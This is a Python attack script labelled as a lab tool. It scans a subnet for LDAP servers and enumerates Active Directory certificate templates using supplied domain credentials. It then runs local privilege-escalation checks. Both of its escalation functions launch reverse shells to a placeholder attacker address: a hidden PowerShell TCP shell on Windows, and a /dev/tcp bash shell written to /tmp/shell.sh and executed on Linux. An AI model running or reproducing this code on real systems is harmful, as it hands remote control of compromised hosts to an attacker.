#!/usr/bin/env python3
import argparse, logging, json, time, ipaddress, socket, os, subprocess, platform
from datetime import datetime
from ldap3 import Server, Connection, NTLM, ALL

LOG_FILE = "lab_adcs_scan.json"

class JsonFormatter(logging.Formatter):
    def format(self, record):
        return json.dumps({'time': datetime.utcnow().isoformat() + 'Z','level': record.levelname,'message': record.getMessage()})

logger = logging.getLogger("ADCSLab")
logger.setLevel(logging.INFO)
console = logging.StreamHandler()
console.setFormatter(logging.Formatter("\033[1;32m[%(levelname)s]\033[0m %(message)s"))
logger.addHandler(console)
file_handler = logging.FileHandler(LOG_FILE)
file_handler.setFormatter(JsonFormatter())
logger.addHandler(file_handler)

class ADCSLabScanner:
    def __init__(self, domain, user, password, ldap_cidr):
        self.domain = domain
        self.user = user
        self.password = password
        self.ldap_cidr = ldap_cidr
        self.dc_list = []
        self.templates = {}

    def find_domain_controllers(self):
        logger.info("Scanning subnet for LDAP servers...")
        for ip in ipaddress.IPv4Network(self.ldap_cidr):
            try:
                sock = socket.create_connection((str(ip), 389), timeout=0.5)
                logger.info(f"Found LDAP service at: {ip}")
                self.dc_list.append(str(ip))
                sock.close()
            except:
                continue

    def enumerate_templates(self, dc_ip):
        logger.info(f"Connecting to LDAP server at {dc_ip}")
        server = Server(dc_ip, get_info=ALL)
        try:
            conn = Connection(server,user=f"{self.domain}\\{self.user}",password=self.password,authentication=NTLM,auto_bind=True)
        except Exception as e:
            logger.error(f"Failed to connect to LDAP: {e}")
            return
        base_dn = f"CN=Configuration,DC={self.domain.replace('.', ',DC=')}"
        search_base = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{base_dn}"
        conn.search(search_base,'(objectClass=pKICertificateTemplate)',attributes=['cn', 'msPKI-Enrollment-Flag'])
        templates = []
        for entry in conn.entries:
            name = entry.cn.value
            flags = entry['msPKI-Enrollment-Flag'].value if 'msPKI-Enrollment-Flag' in entry else "N/A"
            templates.append({'name': name, 'flags': flags})
            logger.info(f"Template: {name} (Flags: {flags})")
        self.templates[dc_ip] = templates

    def run(self):
        self.find_domain_controllers()
        if not self.dc_list:
            logger.warning("No LDAP servers found.")
            return
        for dc_ip in self.dc_list:
            self.enumerate_templates(dc_ip)

def auto_privesc_windows():
    logger.info("Running Windows privilege escalation...")
    try:
        output = subprocess.check_output(["whoami", "/priv"], stderr=subprocess.DEVNULL)
        if b"SeDebugPrivilege" in output:
            logger.info("High privilege: SeDebugPrivilege enabled")
        services = subprocess.check_output("wmic service get name,pathname,startmode", shell=True)
        for line in services.decode().splitlines():
            if "Unquoted" in line or "Program Files" in line:
                logger.info(f"Potential unquoted service path: {line}")
        regkeys = subprocess.check_output("reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", shell=True)
        if b"0x1" in regkeys:
            logger.info("AlwaysInstallElevated enabled - potential privesc vector")
        os.system("powershell -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('YOUR_IP',YOUR_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=Invoke-Expression $d 2>&1 | Out-String ;$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}\"")
    except Exception as e:
        logger.error(f"Windows privesc failed: {e}")

def auto_privesc_linux():
    logger.info("Running Linux privilege escalation...")
    try:
        output = subprocess.check_output("sudo -l", shell=True, stderr=subprocess.DEVNULL).decode()
        if "NOPASSWD" in output:
            logger.info("User can run sudo without password")
        if os.access("/etc/passwd", os.W_OK):
            logger.info("Writable /etc/passwd detected - potential vector")
        if os.path.exists("/tmp/shell.sh"):
            os.chmod("/tmp/shell.sh", 0o777)
        with open("/tmp/shell.sh", "w") as f:
            f.write("#!/bin/bash\nbash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\n")
        subprocess.call("bash /tmp/shell.sh", shell=True)
    except Exception as e:
        logger.error(f"Linux privesc failed: {e}")

def auto_privesc(platform_target):
    logger.info(f"Starting auto privilege escalation for {platform_target}")
    if platform_target == "windows":
        auto_privesc_windows()
    elif platform_target == "linux":
        auto_privesc_linux()
    else:
        logger.warning("Unsupported platform for privesc")

def parse_args():
    parser = argparse.ArgumentParser(description="ADCS Lab Scanner with Auto Privilege Escalation")
    parser.add_argument("--domain", required=True, help="Domain name (e.g., hacklab.local)")
    parser.add_argument("--user", required=True, help="Domain username")
    parser.add_argument("--password", required=True, help="Domain password")
    parser.add_argument("--ldap-cidr", required=True, help="CIDR subnet to scan (e.g., 192.168.1.0/24)")
    parser.add_argument("--platform", choices=["windows", "linux"], required=True, help="Target platform for privesc")
    return parser.parse_args()

def main():
    args = parse_args()
    logger.info("=== ADCS Lab Scanner Started ===")
    scanner = ADCSLabScanner(args.domain, args.user, args.password, args.ldap_cidr)
    scanner.run()
    auto_privesc(args.platform)
    logger.info("=== All Tasks Completed ===")

if __name__ == "__main__":
    main()
